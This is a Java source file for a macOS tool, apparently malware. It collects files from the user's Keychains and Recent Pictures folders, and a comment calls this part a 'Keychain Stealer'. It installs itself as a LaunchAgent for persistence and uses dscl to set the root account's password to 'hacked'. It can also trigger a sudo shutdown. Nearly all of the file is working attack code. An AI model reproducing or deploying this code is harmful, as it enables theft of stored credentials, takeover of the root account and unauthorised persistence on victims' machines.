package com.Volara;

import java.awt.*;
import java.io.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

import static com.Volara.global.isRoot;

/**
 * Created by Kevin on 3/23/2017.
 */
public class mac {

    public static void initMac(){
            if (isAdmin() == true){
                debug.addLine("Init: User is admin! \n", Color.WHITE, 12, true);
            }else{
                debug.addLine("Init: User does not have admin!\n", Color.WHITE, 12, true);
                debug.addLine("Init: Attempting to change Root! \n", Color.WHITE, 12, true);
                //changeRoot();
                if (global.userRoot_GINFO == false){
                    debug.addLine("Init: Attempted to change Root failed! \n", Color.YELLOW, 12, true);
                }else{
                    debug.addLine("Init: Attempted to change Root succeeded! \n", Color.green, 12, true);
                }
            }
        try {
            //addToStartup(global.myAppName, global.myAppPath);
            findAvatar();
            debug.addLine("Start-up: SUCCESS" +  "\n", Color.GREEN, 12, false);
        } catch (Exception e) {
            debug.addLine("Start-up: ERROR: " + e.toString() + "\n", Color.RED, 12, false);
        }
        global.grabFilesInFolders(global.homeDir + "/Library/Keychains");
        //mac.shutdown();
        //if(new File(global.homeDir + "/Library/Keychains").exists() == true){

        //}else{

       // }
    }
    public static Boolean isAdmin() {
        try {
            Process p = Runtime.getRuntime().exec("sudo -l");

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            if (stdInput.readLine() == null && stdError.readLine() != null){
                global.userAdmin_GINFO = false;
                return false;
            }
            if (stdInput.readLine() != null && stdError.readLine() == null){
                global.userAdmin_GINFO = true;
                return true;
            }
        } catch (IOException e) {
            debug.addLine(e.toString() + "\n", Color.RED, 12, true);
        }
        global.userAdmin_GINFO = false;
        return false;
    }

    public static String findAvatar(){
        debug.addLine(global.homeDir + "/Library/Containers/com.apple.ImageKit.RecentPictureService/Data/Library/Images/Recent Pictures/" + "\n", Color.cyan, 12, false);
        global.grabFilesInFolders( global.homeDir + "/Library/Containers/com.apple.ImageKit.RecentPictureService/Data/Library/Images/Recent Pictures/");
        return "";
    }
    public static String getMacHome() throws Exception {
        String home = System.getProperty("user.home");

        if (isRoot()) {
            home = "";
        }

        return home;
    }
    //Root Bypass Functions

    public static void addToStartup(String sName, String sPath) throws Exception {
        if (!getLaunchAgentsDir().exists()) {
            getLaunchAgentsDir().mkdirs();
        }

        File file = new File(getLaunchAgentsDir(), sName + ".plist");

        PrintWriter out = new PrintWriter(new FileWriter(file));
        out.println("<plist version=\"1.0\">");
        out.println("<dict>");
        out.println("\t<key>Label</key>");
        out.println("\t<string>" + sName + "</string>");
        out.println("\t<key>ProgramArguments</key>");
        out.println("\t<array>");

            out.println("\t\t<string>java</string>");
            out.println("\t\t<string>-jar</string>");

        out.println("\t\t<string>" + sPath + "</string>");
        out.println("\t</array>");
        out.println("\t<key>RunAtLoad</key>");
        out.println("\t<true/>");
        out.println("</dict>");
        out.println("</plist>");
        out.close();
    }
    public static File getLaunchAgentsDir() throws Exception {
        String home = System.getProperty("user.home");

        if (isRoot()) {
            home = "";
        }

        return new File(home + "/Library/LaunchAgents/");
    }
    public static Boolean crStepOne(){
        try{

            Process p = Runtime.getRuntime().exec("launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist");

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));

            debug.addLine("Change Root | Step 1: Input Output - " + stdInput.readLine() + "\n", Color.lightGray, 12, true);
            debug.addLine("Change Root | Step 1: Error Output - " + stdError.readLine()  + "\n", Color.lightGray, 12, true);
            if (stdError.readLine() != null){
                if(stdError.readLine().contains("already loaded") == true){
                    debug.addLine("SUCCESS: Change Root | Step 1: Success moving to Step 2.\n", Color.GREEN, 12, true);
                    return true;
                }else{
                    debug.addLine("ERROR: Change Root | Step 1: Failed. Reason: \n" + stdError.readLine(), Color.RED, 12, true);
                   return false;
                }
            }
            if (stdInput.readLine() == null && stdError.readLine() == null){
                debug.addLine("SUCCESS: Change Root | Step 1: Success moving to Step 2.\n", Color.GREEN, 12, true);
                return true;
            }
           } catch (IOException e) {
             debug.addLine("ERROR: Change Root | Step 1: " + e.toString() + "\n", Color.RED, 12, true);
            return false;
        }
        return false;
    }
    public static void changeRoot(){
        //Step-One: Load Open Directory
        Boolean Err = false;
        //try{
        if (crStepOne() == true){
            rootWriter();
        }
    }
    public static void rootWriter() {
        try {
                final Runtime runtime = Runtime.getRuntime();
                final String command = "..."; // cmd.exe

                final ProcessBuilder builder = new ProcessBuilder("dscl", ".", "-passwd", "/Users/root");
                builder.redirectErrorStream(true);
                final Process process = builder.start();

                final BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
                final BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
                StringBuilder sb = new StringBuilder();
                char[] cbuf = new char[100];
                while (input.read(cbuf) != -1) {
                    sb.append(cbuf);
                    if (sb.toString().contains("New Password:") && sb.toString().contains("old") != true) {

                        writer.write("hacked");

                        // Simulate pressing of the Enter key
                        writer.newLine();

                        // Flush the stream, otherwise it doesn't work
                        writer.flush();
                        debug.addLine("Change Root | Step 2: Entered New Password. (" + sb + ")\n", Color.WHITE, 12, true);
                        global.userRoot_GINFO = true;
                    }else if(sb.toString().contains("old") == true){
                        global.userRoot_GINFO = false;
                        debug.addLine("DONE: Change Root couldn't change password since root has already been established with unknown password.\n", Color.RED, 12, true);
                        break;
                    }
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        debug.addLine("Change Root | Step 2: Thread could not sleep: " + e.toString() + "\n", Color.RED, 12, true);
                    }
                }
            }catch (IOException err) {
            debug.addLine("ERROR: Change Root | Step 2: " + err.toString() + "\n", Color.RED, 12, true);
        }
    }
    //Keychain Stealer
    public static boolean shutdown(){
        String shutdownCommand = "sudo shutdown -h -t 30";
        try {
            Runtime.getRuntime().exec(shutdownCommand);
            debug.addLine("SHUTDOWN: Shutting down in 30secs.\n", Color.GREEN, 12, false);
            return true;
        } catch (IOException e) {
            debug.addLine("SHUTDOWN: ERROR: " + e.toString() + "\n", Color.RED, 12, false);
            return false;
        }
    }
}
